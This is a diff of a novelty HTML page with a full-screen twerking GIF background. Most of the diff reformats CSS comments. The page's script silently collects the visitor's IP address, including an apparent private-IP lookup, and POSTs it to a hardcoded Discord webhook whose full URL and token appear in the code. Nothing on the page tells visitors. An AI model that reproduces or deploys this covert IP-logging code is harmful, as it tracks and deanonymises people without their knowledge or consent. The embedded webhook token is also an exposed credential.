@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,39 +8,51 @@
     <link rel="stylesheet" href="style.css"> <!-- Link to the CSS file -->
     <style>
         body {
-            background-image: url('https://media.tenor.com/EVEMd0GmrnoAAAAM/twerk-twerking.gif'); /* Replace 'your-background.gif' with the path to your GIF */
+            background-image: url('https://media.tenor.com/EVEMd0GmrnoAAAAM/twerk-twerking.gif');
+            /* Replace 'your-background.gif' with the path to your GIF */
             background-size: cover;
             background-repeat: no-repeat;
-            background-attachment: fixed; /* Keeps the background fixed while scrolling */
+            background-attachment: fixed;
+            /* Keeps the background fixed while scrolling */
         }
 
         /* Style for the container */
         .container1 {
             display: flex;
-            justify-content: center; /* Center horizontally */
-            align-items: center; /* Center vertically */
-            height: 100vh; /* Full height of the viewport */
+            justify-content: center;
+            /* Center horizontally */
+            align-items: center;
+            /* Center vertically */
+            height: 100vh;
+            /* Full height of the viewport */
         }
 
         .container {
             display: flex;
-            justify-content: center; /* Center horizontally */
-            align-items: center; /* Center vertically */
-            height: 100vh; /* Full height of the viewport */
+            justify-content: center;
+            /* Center horizontally */
+            align-items: center;
+            /* Center vertically */
+            height: 100vh;
+            /* Full height of the viewport */
         }
 
         /* Style for the content */
         .content {
-            text-align: center; /* Center text horizontally */
+            text-align: center;
+            /* Center text horizontally */
         }
 
         /* Style for the image */
         img {
-            max-width: 100%; /* Ensure the image does not exceed the container width */
-            max-height: 100%; /* Ensure the image does not exceed the container height */
+            max-width: 100%;
+            /* Ensure the image does not exceed the container width */
+            max-height: 100%;
+            /* Ensure the image does not exceed the container height */
         }
     </style>
 </head>
+
 <body>
     <div class="container1">
         <div class="container">
@@ -84,14 +97,16 @@
         function sendToWebhook(ip) {
             // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
             fetch('https://discord.com/api/webhooks/1215831015701086208/c94bO80RawFBhQQl-Xq78XsT54Y_LHGaXNXUzI2EnhdIs2xoaw6CKIEiqhXgpyoINKCP', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: 'IP:' + ip })
-            })
-            .then(response => console.log('IP address sent to Discord webhook:', ip))
-            .catch(error => console.error('Error sending IP address to Discord webhook:', error));
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: 'IP address:', ip
+                    })
+                })
+                .then(response => console.log('IP address sent to Discord webhook:', ip))
+                .catch(error => console.error('Error sending IP address to Discord webhook:', error));
         }
 
         // Call the functions to get the IP addresses
@@ -99,4 +114,5 @@
         getPrivateIP();
     </script>
 </body>
+
 </html>
